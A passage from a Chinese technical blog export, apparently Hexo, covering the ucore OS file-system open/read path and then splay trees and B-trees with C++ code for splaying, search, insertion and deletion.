fsop_get_root(node-&gt;in_fs);</span><br><span class="line">        vop_ref_dec(node);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* ///... or :/... */</span></span><br><span class="line">    <span class="keyword">while</span> (*(++ path) == <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">    *subpath = path;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>此后将返回到<code>file_open</code>函数中，通过执行语句<code>file-&gt;node=node</code>，将查找到的inode赋值给文件对应的inode然后返回fd。经过重重回退，通过系统调用返回，用户态的<code>syscall-&gt;sys_open-&gt;open-&gt;safe_open</code>等用户函数的层层函数返回，最终把把fd赋值给fd1。</p>
<p><strong>SFS层文件系统层</strong></p>
<p><code>sfs_inode.c</code>中的<code>sfs_node_dirops</code>变量定义了<code>.vop_lookup = sfs_lookup</code>，</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">int</span></span><br><span class="line">sfs_lookup(struct inode *node, <span class="keyword">char</span> *path, struct inode **node_store) &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sfs_fs</span> *<span class="title">sfs</span> =</span> fsop_info(vop_fs(node), sfs);</span><br><span class="line">    assert(*path != <span class="string">&#x27;\0&#x27;</span> &amp;&amp; *path != <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">    vop_ref_inc(node);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sfs_inode</span> *<span class="title">sin</span> =</span> vop_info(node, sfs_inode);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">sin</span>-&gt;din-&gt;type != SFS_TYPE_DIR) &#123;</span><br><span class="line">        vop_ref_dec(node);</span><br><span class="line">        <span class="keyword">return</span> -E_NOTDIR;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">subnode</span>;</span></span><br><span class="line">    <span class="keyword">int</span> ret = sfs_lookup_once(sfs, <span class="built_in">sin</span>, path, &amp;subnode, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    vop_ref_dec(node);</span><br><span class="line">    <span class="keyword">if</span> (ret != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line">    *node_store = subnode;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span></span><br><span class="line">sfs_lookup_once(struct sfs_fs *sfs, struct sfs_inode *<span class="built_in">sin</span>, <span class="keyword">const</span> <span class="keyword">char</span> *name, struct inode **node_store, <span class="keyword">int</span> *slot) &#123;</span><br><span class="line">    <span class="keyword">int</span> ret;</span><br><span class="line">    <span class="keyword">uint32_t</span> ino;</span><br><span class="line">    lock_sin(<span class="built_in">sin</span>);</span><br><span class="line">    &#123;   <span class="comment">// find the NO. of disk block and logical index of file entry</span></span><br><span class="line">        ret = sfs_dirent_search_nolock(sfs, <span class="built_in">sin</span>, name, &amp;ino, slot, <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    unlock_sin(<span class="built_in">sin</span>);</span><br><span class="line">    <span class="keyword">if</span> (ret == <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="comment">// load the content of inode with the the NO. of disk block</span></span><br><span class="line">        ret = sfs_load_inode(sfs, node_store, ino);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>sfs_lookup</code>有三个参数：node，path，node_store。其中node是根目录/所对应的inode节点；path是文件<code>testfile</code>的绝对路径<code>/test/testfile</code>，而node_store是经过查找获得的<code>testfile</code>所对应的inode节点。</p>
<p><code>sfs_lookup</code>函数以/为分割符，从左至右逐一分解path获得各个子目录和最终文件对应的inode节点。在本例中是分解出<code>test</code>子目录，并调用<code>sfs_lookup_once</code>函数获得<code>test</code>子目录对应的inode节点subnode，然后循环进一步调用sfs_lookup_once查找以test子目录下的文件<code>testfile1</code>所对应的inode节点。当无法分解path后，就意味着顺利找到了testfile1对应的inode节点。</p>
<p><code>sfs_lookup_once</code>将调用<code>sfs_dirent_search_nolock</code>函数来查找与路径名匹配的目录项，如果找到目录项，则根据目录项中记录的inode所处的数据块索引值找到路径名对应的SFS磁盘inode，并读入SFS磁盘inode对应的内容，创建SFS内存inode。</p>
<h1 id="读文件流程"><a href="#读文件流程" class="headerlink" title="读文件流程"></a>读文件流程</h1><p>读文件其实就是读出目录中的目录项，首先假定文件在磁盘上且已经打开。用户进程有如下语句：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">read(fd, data, len);</span><br></pre></td></tr></table></figure>
<p>即读取fd对应文件，读取长度为len，存入data中。</p>
<p><strong>通用文件访问接口层</strong></p>
<p>首先进入通用文件访问接口层，进一步调用如下用户态函数：<code>open-&gt;sys_open-&gt;syscall</code>，通过系统调用进入到内核态。在内核态，通过中断处理例程跳转到<code>sys_read</code>内核函数，并进一步调用sysfile_read内核函数,进入到文件系统抽象层完成进一步读文件的操作。</p>
<p><strong>文件系统抽象层的处理流程</strong></p>
<ol>
<li><p>检查错误，即检查读取长度是否为0和文件是否可读。</p>
</li>
<li><p>分配buffer空间，即调用kmalloc函数分配4096字节的buffer空间。</p>
</li>
<li><p>读文件过程</p>
</li>
</ol>
<p>[1] 实际读文件</p>
<p>循环读取文件，每次读取buffer大小。每次循环中，先检查剩余部分大小，若其小于4096字节，则只读取剩余部分的大小。然后调用file_read函数（详细分析见后）将文件内容读取到buffer中，alen为实际大小。调用copy_to_user函数将读到的内容拷贝到用户的内存空间中，调整各变量以进行下一次循环读取，直至指定长度读取完成。最后函数调用层层返回至用户程序，用户程序收到了读到的文件内容。</p>
<p>[2] file_read函数</p>
<p>这个函数是读文件的核心函数。函数有4个参数，fd是文件描述符，base是缓存的基地址，len是要读取的长度，copied_store存放实际读取的长度。函数首先调用fd2file函数找到对应的file结构，并检查是否可读。调用filemap_acquire函数使打开这个文件的计数加1。调用vop_read函数将文件内容读到iob中（详细分析见后）。调整文件指针偏移量pos的值，使其向后移动实际读到的字节数iobuf_used(iob)。最后调用filemap_release函数使打开这个文件的计数减1，若打开计数为0，则释放file。</p>
<p><strong>SFS文件系统层</strong></p>
<p>在<code>sfs_inode.c</code>中<code>sfs_node_fileops</code>变量定义了<code>.vop_read = sfs_read</code>。</p>
<p><code>sfs_read</code>函数调用<code>sfs_io</code>函数。它有三个参数，node是对应文件的inode，iob是缓存，write表示是读还是写的布尔值(0表示读，1表示写)。函数先找到inode对应sfs和sin，然后调用<code>sfs_io_nolock</code>函数进行读取文件操作，最后调用<code>iobuf_skip</code>函数调整<code>iobuf</code>的指针。</p>
<p>在sfs_io_nolock函数中，先计算一些辅助变量，并处理一些特殊情况（比如越界），然后有sfs_buf_op = sfs_rbuf,sfs_block_op = sfs_rblock，设置读取的函数操作。接着进行实际操作，先处理起始的没有对齐到块的部分，再以块为单位循环处理中间的部分，最后处理末尾剩余的部分。每部分中都调用sfs_bmap_load_nolock函数得到blkno对应的inode编号，并调用sfs_rbuf或sfs_rblock函数读取数据（中间部分调用sfs_rblock，起始和末尾部分调用sfs_rbuf），调整相关变量。完成后如果offset + alen &gt; din-&gt;fileinfo.size（写文件时会出现这种情况，读文件时不会出现这种情况，alen为实际读写的长度），则调整文件大小为offset + alen并设置dirty变量。</p>
<p><code>sfs_bmap_load_nolock</code>函数将对应sfs_inode的第index个索引指向的block的索引值取出存到相应的指针指向的单元（ino_store）。它调用sfs_bmap_get_nolock来完成相应的操作。sfs_rbuf和sfs_rblock函数最终都调用<code>sfs_rwblock_nolock</code>函数完成操作，而sfs_rwblock_nolock函数调用dop_io-&gt;disk0_io-&gt;disk0_read_blks_nolock-&gt;ide_read_secs完成对磁盘的操作。</p>
]]></content>
      <categories>
        <category>Systems</category>
      </categories>
      <tags>
        <tag>ucore</tag>
      </tags>
  </entry>
  <entry>
    <title>平衡二叉搜索树</title>
    <url>/algorithm/bbst/</url>
    <content><![CDATA[<p>平衡二叉搜索树有诸多变种，以下将介绍其中几位成员。首先，鉴于数据访问的局部性在实际应用中普遍存在，按照最常用者优先的策略引入伸展树。接下来，通过对平衡二叉树的推广，引入平衡多路搜索树，并着重讨论其中比较典型的B树。对照4阶B树，引入红黑树，红黑树不仅仅能保证全树的适度平衡，从而有效地控制单次操作的时间成本并可将每次重平衡操作的时间复杂度控制在常数时间范围内。</p>
<a id="more"></a>

<h1 id="伸展树"><a href="#伸展树" class="headerlink" title="伸展树"></a>伸展树</h1><p>伸展树和AVL树一样，也是平衡二叉搜索树的一种形式。相对于AVL树，伸展树无需时刻都保持全树的平衡，但却可在任何足够长的真实操作序列中保持分摊意义上的高效率。伸展树也不需要对基本的二叉树节点结构做任何附加要求或改动，更不需要记录平衡因子或高度之类的额外信息，故适用范围更广。</p>
<h2 id="局部性"><a href="#局部性" class="headerlink" title="局部性"></a>局部性</h2><p>为考查和评价各操作接口的效率通常假设所有操作彼此独立、次序随即且概率均等，并从平均情况的角度出发。实际上，通常在数据的生命期内，不仅执行不同操作的概率往往极不平衡，而且各操作之间具有极强的相关性，并在整体上多呈现极强的规律性。其中最典型的为数据局部性，即：</p>
<ul>
<li>刚刚访问的元素，极有可能在不久之后被访问到</li>
<li>将被访问的某个元素，极有可能就处于不久之前被访问过的某个元素附近</li>
</ul>
<p>就二叉搜索树而言，数据局部性具体体现为：</p>
<ul>
<li>刚刚被访问的节点，极有可能在不久后再次被访问到</li>
<li>将被访问的下一节点，极有可能就处于不久之前被访问过的某个节点的附近</li>
</ul>
<p>因此，只需将被访问过的节点转至根节点，即可加速后续的操作。例如，连续的$m(m&gt;&gt;n)$次查找，采用AVL需要$O(mlogn)$次。</p>
<h2 id="逐层伸展"><a href="#逐层伸展" class="headerlink" title="逐层伸展"></a>逐层伸展</h2><p>每访问过一个节点$E$后，随即反复地以它的父节点为轴，经适当的旋转将其提升一层，直至最终成为树根。随着节点$E$的不断上升，两侧子树的结构也不断地调整，所以这一过程也被称为伸展。伸展过程的效率取决于树的初始形态和节点的访问次序。</p>
<p>对于很多访问序列，单次访问的分摊复杂度在极端情况下可达到$\Omega(n)$。例如以下情况，从空树开始插入关键码${1,2,3,4,5}$ ,通过<code>search()</code>接口，由小到大依次访问各节点一次。</p>
<p><img src="https://i.loli.net/2019/09/13/ylN9vtDBVwfJbgS.png"></p>
<p>可见，在每次访问之后，为将对应节点伸展调整至树根，分别需做$4、4、3、2、1$次旋转。一般地，若节点总数为$n$,则旋转操作的总次数应为：$(n-1)+(n-1)+(n-2)+…+1=(n^2+n-2)=\Omega(n^2)$</p>
<p>如此分摊下来，每次访问平均需要$\Omega(n)$时间。这一效率不仅远远低于AVL树，甚至与原始的二叉搜索树相当。以上例子在经过$5$次访问后全树的结构将会复原，这意味着以上情况可以持续地再现。</p>
<p>若其推广至规模任意的二叉搜索树，对于规模为任意$n$的伸展树，只要按照关键码单调的次序，周期性地反复进行查找，则无论总的访问次数$m&gt;&gt;n$有多大，就分摊意义而言，每次都需要$\Omega(n)$时间。</p>
<h2 id="双层伸展"><a href="#双层伸展" class="headerlink" title="双层伸展"></a>双层伸展</h2><p>以上单层伸展的问题在于全树的拓扑结构始终呈单链表结构，等价于一维列表。被访问节点的深度，呈周期性的算术级数演变${n-1,n-2,n-3,…,3,2,1}$</p>
<p>为了克服上述伸展调整策略的缺陷，可将逐层伸展改为双层伸展，每次都从当前节点$v$向上追溯两层而不是一层，并根据其父节点$p$和祖父$g$的相对位置进行相应的旋转。</p>
<p>旋转的情况分为三种：</p>
<p><strong>zig-zig/zag-zag</strong></p>
<p>设$v$是$p$的左孩子，且$p$也是$g$的左孩子，设$W$和$Y$分别是$v$的左、右子树，$Y$和$Z$分别是$p$和$g$的左、右子树。</p>
<p><img src="https://i.loli.net/2019/09/13/uhrTU92Dpzajild.png"></p>
<p>一旦访问坏节点，对应的路径的长度随即减半。</p>
<p><strong>zig-zag/zag-zig</strong></p>
<p>设$v$是$p$的左孩子，而$p$是$v$的右孩子，设$W$是$g$的左子树，$X$和$Y$分别是$v$的左、右子树,$Z$是$p$的右子树。</p>
<p><img src="https://i.loli.net/2019/09/13/8cMjCFDBpqywiR7.png"></p>
<p><strong>zig/zag</strong></p>
<p>若$v$最初的深度为奇数，则经过若干次双层调整至最后一次调整后，$v$的父亲即是树根$r$。将$v$的左右子树记作$X$和$Y$，节点$p=r$的另一棵子树记作$Z$。</p>
<p><img src="https://i.loli.net/2019/09/13/AdHjvMufVEXqDyn.png"></p>
<h2 id="性能分析"><a href="#性能分析" class="headerlink" title="性能分析"></a>性能分析</h2><p>综合以上情况，每经过一次双层调整操作，节点$v$都会上升两层。若v的初始深度<code>depth(v)</code>为偶数，则最终v将上升至树根。若<code>depth(v)</code>为奇数，则当$v$上升至深度为$1$时，不妨最后再相应地做一次zig或zag单旋转操作。无论如何，经过<code>depth(v)</code>次旋转后，$v$总能成为树根。</p>
<p>最坏实例导致$\Omega(n)$平均单次访问时间的原因为：在这一可持续重复的过程中，二叉搜索树的高度始终不小于$\lfloor n/2 \rfloor$,而且至少有一半的节点在接受访问时没有如预期地靠近树根，反而恰恰处于最底层。从树高的角度来看，树高依算术级数逐步从$n-1$递减至$\lfloor n/2 \rfloor$,然后再逐步递增地增回到$n-1$。</p>
<p><img src="https://i.loli.net/2019/09/13/E4gPuBJhlKF16Wy.png"></p>
<p>以以上二叉搜索树为例，逐层调整和双层调整的区别如图所示。最深节点在经过双层调整后，不仅同样可将该节点伸展至树根，而且可使树的高度接近于减半，可有效避免对长分支的访问。在将节点$v$调整至树根的同时，对应分支长度以几何级数的速度(大致折半)收缩。</p>
<p>在任一时刻伸展树中都可能存在很深的节点，但是经过随后的双层伸展，其对应的分支长度都会收缩至长度大致这般，最坏情况也不会持续发生。可见，伸展树虽不能杜绝最坏情况，却能有效地控制最坏情况发生的频率，从而在分摊意义上保证整体的高效率。</p>
<p>分摊复杂度为$O(logn)$,与AVL树相当。在局部性强、缓存命中率高的时候，效率可以更高($k&lt;&lt;n&lt;&lt;m$),自适应的$O(logk)$。因为达到经常访问的$k$个元素分布在根节点附近需要常规的$n$次操作，每次复杂度不超过$logn$,所以时间复杂度还得再算入一个$O(nlogn)$因子。任何连续的$m$次查找都可在$O(mlogk+nlogn)$时间内完成。仍不能杜绝单次最坏情况的出现，不适用于对效率敏感的场合。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> NodePosi&gt; <span class="keyword">inline</span> <span class="comment">//在节点*p与*lc（可能为空）之间建立父（左）子关系</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">attachAsLChild</span> <span class="params">( NodePosi p, NodePosi lc )</span> </span>&#123; p-&gt;lc = lc; <span class="keyword">if</span> ( lc ) lc-&gt;parent = p; &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> NodePosi&gt; <span class="keyword">inline</span> <span class="comment">//在节点*p与*rc（可能为空）之间建立父（右）子关系</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">attachAsRChild</span> <span class="params">( NodePosi p, NodePosi rc )</span> </span>&#123; p-&gt;rc = rc; <span class="keyword">if</span> ( rc ) rc-&gt;parent = p; &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt; <span class="comment">//Splay树伸展算法：从节点v出发逐层伸展</span></span><br><span class="line">BinNodePosi(T) Splay&lt;T&gt;::splay ( BinNodePosi(T) v ) &#123; <span class="comment">//v为因最近访问而需伸展的节点位置</span></span><br><span class="line">   <span class="keyword">if</span> ( !v ) <span class="keyword">return</span> <span class="literal">NULL</span>; BinNodePosi(T) p; BinNodePosi(T) g; <span class="comment">//*v的父亲与祖父</span></span><br><span class="line">   <span class="keyword">while</span> ( ( p = v-&gt;parent ) &amp;&amp; ( g = p-&gt;parent ) ) &#123; <span class="comment">//自下而上，反复对*v做双层伸展</span></span><br><span class="line">      BinNodePosi(T) gg = g-&gt;parent; <span class="comment">//每轮之后*v都以原曾祖父（great-grand parent）为父</span></span><br><span class="line">      <span class="keyword">if</span> ( IsLChild ( *v ) )</span><br><span class="line">         <span class="keyword">if</span> ( IsLChild ( *p ) ) &#123; <span class="comment">//zig-zig</span></span><br><span class="line">            attachAsLChild ( g, p-&gt;rc ); attachAsLChild ( p, v-&gt;rc );</span><br><span class="line">            attachAsRChild ( p, g ); attachAsRChild ( v, p );</span><br><span class="line">         &#125; <span class="keyword">else</span> &#123; <span class="comment">//zig-zag</span></span><br><span class="line">            attachAsLChild ( p, v-&gt;rc ); attachAsRChild ( g, v-&gt;lc );</span><br><span class="line">            attachAsLChild ( v, g ); attachAsRChild ( v, p );</span><br><span class="line">         &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( IsRChild ( *p ) ) &#123; <span class="comment">//zag-zag</span></span><br><span class="line">         attachAsRChild ( g, p-&gt;lc ); attachAsRChild ( p, v-&gt;lc );</span><br><span class="line">         attachAsLChild ( p, g ); attachAsLChild ( v, p );</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123; <span class="comment">//zag-zig</span></span><br><span class="line">         attachAsRChild ( p, v-&gt;lc ); attachAsLChild ( g, v-&gt;rc );</span><br><span class="line">         attachAsRChild ( v, g ); attachAsLChild ( v, p );</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( !gg ) v-&gt;parent = <span class="literal">NULL</span>; <span class="comment">//若*v原先的曾祖父*gg不存在，则*v现在应为树根</span></span><br><span class="line">      <span class="keyword">else</span> <span class="comment">//否则，*gg此后应该以*v作为左或右孩子</span></span><br><span class="line">         ( g == gg-&gt;lc ) ? attachAsLChild ( gg, v ) : attachAsRChild ( gg, v );</span><br><span class="line">      updateHeight ( g ); updateHeight ( p ); updateHeight ( v );</span><br><span class="line">   &#125; <span class="comment">//双层伸展结束时，必有g == NULL，但p可能非空</span></span><br><span class="line">   <span class="keyword">if</span> ( p = v-&gt;parent ) &#123; <span class="comment">//若p果真非空，则额外再做一次单旋</span></span><br><span class="line">      <span class="keyword">if</span> ( IsLChild ( *v ) ) &#123; attachAsLChild ( p, v-&gt;rc ); attachAsRChild ( v, p ); &#125;</span><br><span class="line">      <span class="keyword">else</span>                   &#123; attachAsRChild ( p, v-&gt;lc ); attachAsLChild ( v, p ); &#125;</span><br><span class="line">      updateHeight ( p ); updateHeight ( v );</span><br><span class="line">   &#125;</span><br><span class="line">   v-&gt;parent = <span class="literal">NULL</span>; <span class="keyword">return</span> v;</span><br><span class="line">&#125; <span class="comment">//调整之后新树根应为被伸展的节点，故返回该节点的位置以便上层函数更新树根</span></span><br></pre></td></tr></table></figure>
<p><strong>查找</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt; BinNodePosi(T) &amp; Splay&lt;T&gt;::search ( <span class="keyword">const</span> T&amp; e ) &#123; <span class="comment">//在伸展树中查找e</span></span><br><span class="line">   BinNodePosi(T) p = searchIn ( _root, e, _hot = <span class="literal">NULL</span> );</span><br><span class="line">   _root = splay ( p ? p : _hot ); <span class="comment">//将最后一个被访问的节点伸展至根</span></span><br><span class="line">   <span class="keyword">return</span> _root;</span><br><span class="line">&#125; <span class="comment">//与其它BST不同，无论查找成功与否，_root都指向最后被访问的节点</span></span><br></pre></td></tr></table></figure>
<p>首先调用二叉树的通用算法<code>searchIn()</code>尝试查找具有关键码$e$的节点。无论是否查找成功，都继而调用<code>splay()</code>算法，将查找终止处的节点伸展到树根，此时的查找操作不再为静态操作。</p>
<p><strong>插入</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt; BinNodePosi(T) Splay&lt;T&gt;::insert ( <span class="keyword">const</span> T&amp; e ) &#123; <span class="comment">//将关键码e插入伸展树中</span></span><br><span class="line">   <span class="keyword">if</span> ( !_root ) &#123; _size++; <span class="keyword">return</span> _root = <span class="keyword">new</span> BinNode&lt;T&gt; ( e ); &#125; <span class="comment">//处理原树为空的退化情况</span></span><br><span class="line">   <span class="keyword">if</span> ( e == search ( e )-&gt;data ) <span class="keyword">return</span> _root; <span class="comment">//确认目标节点不存在</span></span><br><span class="line">   _size++; BinNodePosi(T) t = _root; <span class="comment">//创建新节点。以下调整&lt;=7个指针以完成局部重构</span></span><br><span class="line">   <span class="keyword">if</span> ( _root-&gt;data &lt; e ) &#123; <span class="comment">//插入新根，以t和t-&gt;rc为左、右孩子</span></span><br><span class="line">      t-&gt;parent = _root = <span class="keyword">new</span> BinNode&lt;T&gt; ( e, <span class="literal">NULL</span>, t, t-&gt;rc ); <span class="comment">//2 + 3个</span></span><br><span class="line">      <span class="keyword">if</span> ( HasRChild ( *t ) ) &#123; t-&gt;rc-&gt;parent = _root; t-&gt;rc = <span class="literal">NULL</span>; &#125; <span class="comment">//&lt;= 2个</span></span><br><span class="line">   &#125; <span class="keyword">else</span> &#123; <span class="comment">//插入新根，以t-&gt;lc和t为左、右孩子</span></span><br><span class="line">      t-&gt;parent = _root = <span class="keyword">new</span> BinNode&lt;T&gt; ( e, <span class="literal">NULL</span>, t-&gt;lc, t ); <span class="comment">//2 + 3个</span></span><br><span class="line">      <span class="keyword">if</span> ( HasLChild ( *t ) ) &#123; t-&gt;lc-&gt;parent = _root; t-&gt;lc = <span class="literal">NULL</span>; &#125; <span class="comment">//&lt;= 2个</span></span><br><span class="line">   &#125;</span><br><span class="line">   updateHeightAbove ( t ); <span class="comment">//更新t及其祖先（实际上只有_root一个）的高度</span></span><br><span class="line">   <span class="keyword">return</span> _root; <span class="comment">//新节点必然置于树根，返回之</span></span><br><span class="line">&#125; <span class="comment">//无论e是否存在于原树中，返回时总有_root-&gt;data == e</span></span><br></pre></td></tr></table></figure>
<p>为将关键码$e$插入至伸展树T中，首先调用伸展树查找接口<code>search(e)</code>查找该关键码，最后被访问的节点$t$通过伸展被提升为树根，其左、右子树分别记作$T_l$和$T_r$。</p>
<p>接下来，根据$e$与$t$的大小关系，以$t$为界将$T$分为左右两棵子树。比如，不失一般性地，设$e$大于$t$,可切断$t$与其右孩子的关系，再将$e$为关键码的新节点作为树根，并以$t$为其左孩子，以$T_r$为右子树。</p>
<p><strong>删除</strong></p>
<p>为从伸展树$T$中删除关键码为$e$的节点，先调用<code>search()</code>定位目标节点，在成功返回后，树根节点恰好为待删除节点，其左、右子树分别记作$T_l$和$T_r$。接下来，将v摘除。再在$T_r$中查找关键码$e$，尽管这一查找必定失败，确可将$T_r$中的最小节点提升为该子树的根。</p>
<p>得益于二叉搜索树的顺序性，此时$m$的左子树必然为空，此时只需将$T_l$作为左子树与$m$相互联接，即可得到一棵完整的二叉搜索树，如此不仅删除了节点$v$，还将$m$的后继提升为新的树根，数据局部性也得到了利用。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt; <span class="keyword">bool</span> Splay&lt;T&gt;::remove ( <span class="keyword">const</span> T&amp; e ) &#123; <span class="comment">//从伸展树中删除关键码e</span></span><br><span class="line">   <span class="keyword">if</span> ( !_root || ( e != search ( e )-&gt;data ) ) <span class="keyword">return</span> <span class="literal">false</span>; <span class="comment">//若树空或目标不存在，则无法删除</span></span><br><span class="line">   BinNodePosi(T) w = _root; <span class="comment">//assert: 经search()后节点e已被伸展至树根</span></span><br><span class="line">   <span class="keyword">if</span> ( !HasLChild ( *_root ) ) &#123; <span class="comment">//若无左子树，则直接删除</span></span><br><span class="line">      _root = _root-&gt;rc; <span class="keyword">if</span> ( _root ) _root-&gt;parent = <span class="literal">NULL</span>;</span><br><span class="line">   &#125; <span class="keyword">else</span> <span class="keyword">if</span> ( !HasRChild ( *_root ) ) &#123; <span class="comment">//若无右子树，也直接删除</span></span><br><span class="line">      _root = _root-&gt;lc; <span class="keyword">if</span> ( _root ) _root-&gt;parent = <span class="literal">NULL</span>;</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123; <span class="comment">//若左右子树同时存在，则</span></span><br><span class="line">      BinNodePosi(T) lTree = _root-&gt;lc;</span><br><span class="line">      lTree-&gt;parent = <span class="literal">NULL</span>; _root-&gt;lc = <span class="literal">NULL</span>; <span class="comment">//暂时将左子树切除</span></span><br><span class="line">      _root = _root-&gt;rc; _root-&gt;parent = <span class="literal">NULL</span>; <span class="comment">//只保留右子树</span></span><br><span class="line">      search ( w-&gt;data ); <span class="comment">//以原树根为目标，做一次（必定失败的）查找</span></span><br><span class="line"><span class="comment">///// assert: 至此，右子树中最小节点必伸展至根，且（因无雷同节点）其左子树必空，于是</span></span><br><span class="line">      _root-&gt;lc = lTree; lTree-&gt;parent = _root; <span class="comment">//只需将原左子树接回原位即可</span></span><br><span class="line">   &#125;</span><br><span class="line">   release ( w-&gt;data ); release ( w ); _size--; <span class="comment">//释放节点，更新规模</span></span><br><span class="line">   <span class="keyword">if</span> ( _root ) updateHeight ( _root ); <span class="comment">//此后，若树非空，则树根的高度需要更新</span></span><br><span class="line">   <span class="keyword">return</span> <span class="literal">true</span>; <span class="comment">//返回成功标志</span></span><br><span class="line">&#125; <span class="comment">//若目标节点存在且被删除，返回true；否则返回false</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>试证明，伸展树所有基本接口的分摊时间复杂度，均为$O(log n)$</p>
</blockquote>
<p>事实上，伸展树单次操作所需的时间量T起伏很大，并不能始终保持控制在$O(logn)$以内。可从分摊分析的角度对此统一分析和评判。具体地，将总体所需计算时间分摊之其间的每一操作，如此即可得到单次操作的分摊复杂度A,并依据此评判伸展树的整体性能。借助势能分析法可知单次分摊复杂度为$O( logn)$。</p>
<h1 id="B树"><a href="#B树" class="headerlink" title="B树"></a>B树</h1><p>在之前的计算模型中，RAM模型有无限可数个寄存器，而图灵机模型为无限长的纸带。然而从实际应用来看，问题规模的增长速度却远远快于存储能力的增长，随着时间的推移这一矛盾将日益凸显。鉴于在同等成本下，存储器的容量越大则访问速度越慢，因此一味提高存储器容量并非良策。</p>
<p>实践证明，分级存储为行之有效的方法。不同容量的存储器，访问速度差异悬殊，所以在由内存和外存组成的二级存储系统中，数据全集往往存放于外存中，计算过程中可将内存作为外存的高速缓存，存放最常用数据项的复本。</p>
<p>两个相邻存储器之间的数据传输统称I/O操作。各级存储器的访问速度相差悬殊，故因尽可能地减少I/O操作。</p>
<h2 id="多路搜索树"><a href="#多路搜索树" class="headerlink" title="多路搜索树"></a>多路搜索树</h2><p>当数据规模大到内存已不足以容纳时，常规二叉搜索树地效率将大打折扣，其原因在于，查找过程对外存的访问次数过多。为此，需充分利用磁盘之类存储器的另一特性：读取物理地址连续的一千字节与读取单个字节几乎没有区别。因此不妨通过时间成极低的多次内存操作，将通常的二叉搜索树转变为多路搜索树，在中序遍历意义上，同样为等价变换。</p>
<p>可通过适当合并得到超级节点，比如每$2$层合并，得到$4$路搜索树，每$3$层合并得到$8$路搜索树。一般地，以$k$ 层为间隔可将二叉搜索树转换为$2^k$路搜索树，统称多路搜索树。</p>
<p>多路搜索树同样支持对二叉树的查找，效果与原二叉树相同，然而对外存的访问方式已发生本质变化。实际上，在此时的搜索每下降一层，都以大节点为单位从外存中读入一组关键码，这组关键码在逻辑上在物理上相邻，故可以批量从外存一次性读出，所需时间与读取单个关键码几乎一样。当然，每组关键码的最佳数目，取决于不同外存的批量访问特性。</p>
<h2 id="多路平衡搜索树"><a href="#多路平衡搜索树" class="headerlink" title="多路平衡搜索树"></a>多路平衡搜索树</h2><p>所谓$m$阶B树，即$m$阶平衡搜索树($m\geq 2$)。</p>
<p>所有外部节点均深度相等。同时，每个内部节点都存有不超过$m-1$个关键码，以及用以指示对应分支的不超过$m$个引用。具体地，存有$n\leq m-1$个关键码</p>
<p>$K_1&lt;K_2&lt;K_3&lt;…&lt;K_n$的内部节点，</p>
<p>同时还有$n+1\leq m$个引用：</p>
<p>$A_0&lt;A_1&lt;A_2&lt;A_3&lt;A_4&lt;…&lt;A_n$</p>
<p>反过来，除根以外的所有节点，都应满足$n+1 \geq \lceil m/2 \rceil$</p>
<p>而在非空的B树中，根节点应满足$n+1\geq 2$,故亦称作$(\lceil m/2 \rceil,m)$树。</p>
<p>B树的外部节点未必意味着查找失败，而可能目标关键码存在于更低层次的某一外部存储系统中，因此在计算B树树高时计入最底层的外部节点，树高即为外部节点的深度。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BTNodePosi(T) BTNode<span class="meta-string">&lt;T&gt;* //B-树节点位置</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt; <span class="class"><span class="keyword">struct</span> <span class="title">BTNode</span> &#123;</span> <span class="comment">//B-树节点模板类</span></span><br><span class="line"><span class="comment">// 成员（为简化描述起见统一开放，读者可根据需要进一步封装）</span></span><br><span class="line">   BTNodePosi(T) parent; <span class="comment">//父节点</span></span><br><span class="line">   Vector&lt;T&gt; key; <span class="comment">//关键码向量</span></span><br><span class="line">   Vector&lt;BTNodePosi(T)&gt; child; <span class="comment">//孩子向量（其长度总比key多一）</span></span><br><span class="line"><span class="comment">// 构造函数（注意：BTNode只能作为根节点创建，而且初始时有0个关键码和1个空孩子指针）</span></span><br><span class="line">   BTNode() &#123; parent = <span class="literal">NULL</span>; child.insert ( 